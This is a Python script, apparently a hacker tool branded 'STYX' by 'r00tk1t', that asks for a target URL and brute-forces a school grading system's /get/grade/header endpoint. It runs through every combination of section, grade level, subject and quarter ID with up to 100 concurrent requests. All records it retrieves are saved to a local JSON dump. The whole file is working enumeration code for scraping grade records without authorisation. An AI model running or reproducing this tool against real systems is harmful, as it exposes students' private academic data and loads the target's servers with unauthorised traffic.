import asyncio
import aiohttp
import json
import sys
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

def _build_banner():
    CYAN    = "\033[96m"
    PURPLE  = "\033[95m"
    WHITE = "\033[97m"
    RESET   = "\033[0m"

    art = [
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⢶⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣄⢞⢿⢿⠠⠀⠀⠀⠀⣠⢶⣿⣷⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⢠⢴⣦⢴⣿⢉⠀⠀⠈⢳⠤⠀⢠⢾⣿⠁⠈⣿⠦⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⢿⢛⠉⠉⠁⠀⠀⠀⢹⠤⣿⣿⣿⠀⠀⢹⠧⠀⠀⠀",
        "⠀⠀⠀⠀⠀⣠⢾⢟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⢰⢏⢻⣿⣿⠦⠀⠸⣿⠀⠀⠀",
        "⠀⠀⠀⢠⢴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢾⣿⣿⣦⢹⣿⣷⠀⠘⣿⠀⠀⠀",
        "⠀⠀⢠⢞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⢹⢿⣲⣿⣿⣧⠀⠀",
        "⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⣿⣿⣿⣷⢾⣿⠧⢠⠀⢼⣿⣿⣿⣧⠀",
        "⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠙⢿⣿⣿⣿⠀",
        "⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⠙⢿⢿⣿⠦",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⠙⠛⣿⣿⣿⣿⢟⠀⢟⠀⠀⢠⣿⠧",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣄⢉⠛⠿⠇⢠⣿⢾⣿⠤⢻⠧",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣄⢾⣿⣿⣿⣿⣦⠁",
    ]

    styx = [
        "███████╗████████╗██╗   ██╗██╗  ██╗",
        "██╔════╝╚══██╔══╝╚██╗ ██╔╝╚██╗██╔╝",
        "███████╗   ██║    ╚████╔╝  ╚███╔╝ ",
        "╚════██║   ██║     ╚██╔╝   ██╔██╗ ",
        "███████║   ██║      ██║   ██╔╝ ██╗",
        "╚══════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝",
    ]

    T = max(len(l) for l in styx)

    colored_title = (
        [" " * T] * 3
        + [f"{CYAN}{l}{RESET}{' ' * (T - len(l))}" for l in styx]
        + [" " * T] * 4
    )

    lines = [""]
    for t, a in zip(colored_title, art):
        lines.append(f"  {t}    {WHITE}{a}{RESET}")
    lines.append(f"\n  \033[90mgrade header enumerator  //  made by r00tk1t{RESET}\n")
    return "\n".join(lines)

BANNER = _build_banner()
print(BANNER)

try:
    BASE_URL       = input("\033[96m[?]\033[0m Target URL           : ").strip().rstrip("/")
    SY_ID          = int(input("\033[96m[?]\033[0m SY ID (default 1)    : ").strip() or "1")
    MAX_CONCURRENT = int(input("\033[96m[?]\033[0m Concurrency (default 100): ").strip() or "100")
    SID_RANGE   = int(input("\033[96m[?]\033[0m Max Section ID to scan  : ").strip() or "100")
    LID_RANGE   = int(input("\033[96m[?]\033[0m Max Level ID to scan    : ").strip() or "30")
    SUBID_RANGE = int(input("\033[96m[?]\033[0m Max Subject ID to scan  : ").strip() or "50")
    DEBUG       = input("\033[96m[?]\033[0m Debug requests? (y/N)   : ").strip().lower() == "y"
except KeyboardInterrupt:
    print("\n\033[93m[!]\033[0m Aborted.")
    raise SystemExit(0)

QUARTERS = [1, 2, 3, 4]
print()

headers_found = []

async def fetch(session, semaphore, lock, section_id, level_id, subj_id, q):
    async with semaphore:
        try:
            params = {
                "syid": SY_ID,
                "gradelevelid": level_id,
                "subjectid": subj_id,
                "quarter": q,
                "sectionid": section_id
            }
            if DEBUG:
                tqdm.write(
                    f"\033[90m[>] GET /get/grade/header?syid={SY_ID}&gradelevelid={level_id}"
                    f"&subjectid={subj_id}&quarter={q}&sectionid={section_id}\033[0m"
                )
            async with session.get(
                f"{BASE_URL}/get/grade/header",
                params=params,
                timeout=aiohttp.ClientTimeout(total=3)
            ) as r:
                if DEBUG:
                    tqdm.write(f"\033[90m[<] {r.status} sec={section_id} lvl={level_id} subj={subj_id} q={q}\033[0m")
                if r.status != 200:
                    return
                data = await r.json(content_type=None)
                if DEBUG:
                    tqdm.write(f"\033[90m[=] {len(data) if data else 0} record(s) sec={section_id} lvl={level_id} subj={subj_id} q={q}\033[0m")
                if data:
                    async with lock:
                        headers_found.extend(data)
                    tqdm.write(
                        f"\033[92m[+]\033[0m sec={section_id} lvl={level_id} "
                        f"subj={subj_id} q={q} → {len(data)} header(s) | "
                        f"total: \033[93m{len(headers_found)}\033[0m"
                    )
        except Exception as e:
            if DEBUG:
                tqdm.write(f"\033[91m[!] ERR sec={section_id} lvl={level_id} subj={subj_id} q={q} — {e}\033[0m")

async def main():
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    lock = asyncio.Lock()

    pairs = [
         (section_id, level_id, subj_id, q)
          for section_id in range(1, SID_RANGE + 1)
          for level_id   in range(1, LID_RANGE + 1)
          for subj_id    in range(1, SUBID_RANGE + 1)
          for q in QUARTERS
    ]

    async with aiohttp.ClientSession() as session:
        pbar = tqdm(total=len(pairs), desc="Enumerating", colour="cyan", unit="req")

        async def run(section_id, level_id, subj_id, q):
            await fetch(session, semaphore, lock, section_id, level_id, subj_id, q)
            pbar.update(1)
            pbar.set_postfix(found=len(headers_found))

        tasks = [asyncio.create_task(run(*p)) for p in pairs]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            pbar.close()

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("\n\033[93m[!]\033[0m Interrupted — saving partial results...")

with open("dumps/grade_headers.json", "w") as f:
    json.dump(headers_found, f, indent=2)

print(f"\n\033[96m[*]\033[0m Done scanning")
print(f"\033[96m[*]\033[0m Total found: \033[93m{len(headers_found)}\033[0m")
